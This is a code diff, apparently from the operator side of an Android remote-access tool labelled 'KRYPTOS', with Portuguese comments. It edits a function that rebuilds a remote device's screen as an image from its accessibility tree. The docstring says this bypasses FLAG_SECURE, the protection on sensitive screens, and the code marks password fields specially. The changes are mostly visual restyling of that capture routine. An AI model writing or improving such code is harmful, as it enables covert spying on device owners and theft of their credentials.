@@ -937,7 +937,7 @@ class DeviceConnectionManager:
                 logger.warning("VNC_WD err: " + str(e))
 
     def render_tree_image(self, device_id: str, tree):
-        """[KRYPTOS] Arvore como imagem (bypass FLAG_SECURE) - v2 legivel."""
+        """[KRYPTOS] Arvore como imagem (bypass FLAG_SECURE) - v3 clara."""
         try:
             import json as _j
             from io import BytesIO as _B
@@ -960,7 +960,7 @@ class DeviceConnectionManager:
                 W, H = 1080, 2400
             scale = min(1.0, 640.0 / float(W))
             ow = max(1, int(W * scale)); oh = max(1, int(H * scale))
-            img = Image.new("RGB", (ow, oh), (12, 12, 16))
+            img = Image.new("RGB", (ow, oh), (246, 246, 249))
             d = ImageDraw.Draw(img, "RGBA")
             fp = None
             for cand in ("C:/Windows/Fonts/arial.ttf", "C:/Windows/Fonts/segoeui.ttf"):
@@ -984,13 +984,19 @@ class DeviceConnectionManager:
                 if sz not in fc:
                     fc[sz] = ImageFont.truetype(fp, sz) if fp else ImageFont.load_default()
                 return fc[sz]
+            def _txt(n):
+                for k in ("text", "desc", "contentDescription", "hint", "label", "tooltip", "stateDesc"):
+                    v = n.get(k)
+                    if v is None:
+                        continue
+                    s = str(v).strip()
+                    if not s or s.lower() in ("true", "false"):
+                        continue
+                    return s
+                return ""
             drawn = 0
             for n in nodes:
-                t = ""
-                for k in ("text", "desc", "contentDescription", "hint", "label"):
-                    v = n.get(k)
-                    if v:
-                        t = str(v); break
+                t = _txt(n)
                 if not t:
                     continue
                 nb = n.get("bounds") or {}
@@ -1002,14 +1008,13 @@ class DeviceConnectionManager:
                 if w <= 1 or h <= 1:
                     continue
                 pwd = bool(n.get("password"))
-                _clk = bool(n.get("clickable")) or bool(n.get("desc")) or bool(n.get("contentDescription"))
-                if _clk:
+                if n.get("clickable"):
                     try:
                         d.rounded_rectangle([x, y, x + w, y + h], radius=max(4, min(h // 3, 14)),
-                                            fill=(255, 255, 255, 16),
-                                            outline=((110, 240, 150, 200) if pwd else (120, 150, 230, 170)), width=2)
+                                            fill=(0, 0, 0, 10),
+                                            outline=((20, 160, 100, 220) if pwd else (120, 140, 200, 200)), width=2)
                     except Exception:
-                        d.rectangle([x, y, x + w, y + h], outline=(120, 150, 230, 170))
+                        d.rectangle([x, y, x + w, y + h], outline=(120, 140, 200, 200))
                 fsz = max(11, int(h * 0.58))
                 fnt = _fnt(fsz)
                 tx = t if len(t) <= 60 else t[:60] + ".."
@@ -1020,16 +1025,16 @@ class DeviceConnectionManager:
                 except Exception:
                     pass
                 d.text((x + 5, y + max(0, (h - fsz) // 2 - 1)), tx, font=fnt,
-                       fill=((150, 255, 180) if pwd else (240, 240, 248)))
+                       fill=((10, 130, 80) if pwd else (28, 28, 36)))
                 drawn += 1
             if drawn < 1:
                 return None
             pkg = str(tree.get("package") or "")
             bar = max(16, int(oh * 0.022))
-            d.rectangle([0, 0, ow, bar], fill=(0, 0, 0, 235))
-            d.text((6, 2), "[ARVORE] " + pkg, font=_fnt(bar - 4), fill=(255, 215, 110))
+            d.rectangle([0, 0, ow, bar], fill=(38, 42, 58))
+            d.text((6, 2), "[ARVORE] " + pkg, font=_fnt(bar - 4), fill=(255, 235, 160))
             buf = _B()
-            img.save(buf, "JPEG", quality=78)
+            img.save(buf, "JPEG", quality=80)
             return buf.getvalue()
         except Exception as e:
             logger.warning("render_tree err: " + str(e))
